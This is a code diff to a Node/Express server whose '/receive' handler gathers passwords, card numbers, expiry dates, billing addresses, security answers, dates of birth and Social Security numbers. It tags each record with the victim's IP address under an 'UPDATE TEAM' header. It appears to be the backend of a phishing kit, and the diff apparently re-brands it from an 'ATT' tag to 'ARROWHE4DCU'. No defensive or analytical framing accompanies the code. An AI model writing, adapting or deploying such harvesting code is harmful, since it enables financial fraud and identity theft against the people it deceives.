@@ -59,8 +59,8 @@ app.get('/login/2', async (req, res) => {
         const htmlContent = await fs.readFile('secque.html', 'utf-8');
 
         // Send the HTML content as a response
-        res.send(htmlContent);
-        //res.sendFile(path.join(__dirname, 'secque.html'));
+        //res.send(htmlContent);
+        res.sendFile(path.join(__dirname, 'secque.html'));
     } catch (error) {
         // Handle any errors, for example, file not found
         console.error('Error reading file:', error);
@@ -118,11 +118,11 @@ app.post('/receive', async (req, res) => {
 	console.log(myObjects);
 
   if (myObjects.includes('Password')) {
-    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
-               `👤 ${myObject['loginTime']}\n\n`;
+    message += `✅ UPDATE TEAM | ARROWHE4DCU | USER_${ipAddress}\n\n` +
+               `👤 ${myObject['visitor']}\n\n`;
 
     for (const key of myObjects) {
-	    if (key !== 'loginTime') {
+	    if (key !== 'visitor') {
     console.log(`${key}: ${myObject[key]}`);
       message += `${key}: ${myObject[key]}\n`;;
 	    }
@@ -147,7 +147,7 @@ app.post('/receive', async (req, res) => {
   }
 
   if (myObjects.includes('Expiry-Date') || myObjects.includes('Card-Number') || myObjects.includes('Billing Address')) {
-    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | ARROWHE4DCU | USER_${ipAddress}\n\n` +
                `👤 CARD INFO\n\n`;
 
     for (const key of myObjects) {
@@ -164,8 +164,8 @@ res.send('dn');
   }
   
   if (myObjects.includes('message')) {
-    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
-               `👤 CARD INFO\n\n`;
+    message += `✅ UPDATE TEAM | ARROWHE4DCU | USER_${ipAddress}\n\n` +
+               `👤 SECURITY Q&A\n\n`;
 
     for (const key of myObjects) {
       console.log(`${key}: ${myObject[key]}`);
@@ -181,8 +181,8 @@ res.send('dn');
   }
 
   if (myObjects.includes('DOB') || myObjects.includes('SSN') || myObjects.includes('State')) {
-    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
-               `👤 CARD INFO\n\n`;
+    message += `✅ UPDATE TEAM | ARROWHE4DCU | USER_${ipAddress}\n\n` +
+               `👤 CONTACT INFO\n\n`;
 
     for (const key of myObjects) {
       console.log(`${key}: ${myObject[key]}`);
